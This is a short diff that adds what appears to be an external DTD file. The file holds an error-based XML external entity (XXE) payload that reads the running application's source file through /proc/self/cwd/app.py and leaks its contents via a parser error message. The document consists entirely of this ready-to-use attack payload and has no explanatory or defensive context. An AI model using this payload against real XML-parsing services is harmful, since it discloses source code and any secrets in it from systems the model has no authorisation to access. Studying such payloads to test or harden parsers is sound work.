@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///proc/self/cwd/app.py">
+<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%err;
